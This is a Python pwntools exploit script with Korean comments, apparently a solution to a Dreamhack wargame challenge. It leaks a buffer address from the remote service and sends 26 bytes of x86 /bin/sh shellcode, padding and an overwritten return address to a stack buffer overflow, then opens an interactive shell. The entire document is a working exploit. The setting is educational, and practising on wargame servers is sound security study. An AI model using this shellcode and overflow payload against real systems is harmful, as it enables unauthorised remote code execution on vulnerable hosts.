from pwn import *

connection = remote('host1.dreamhack.games' , 13040) 

shell_code = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80' # 26 바이트
buf = b'0'*102 # 버퍼의 크기 128 = len of shell code + dummy
rbp = b'0'*4 
buf_addr = int(connection.recv()[7:17],16) # connection을 통해 받은 값들에서, 7~17 index의 값을 가져오고, 16진수 형태로 받는다. > 그 값을 int로
ret_addr = p32(buf_addr)

pload = shell_code+buf+rbp+ret_addr

connection.sendline(pload)

connection.interactive()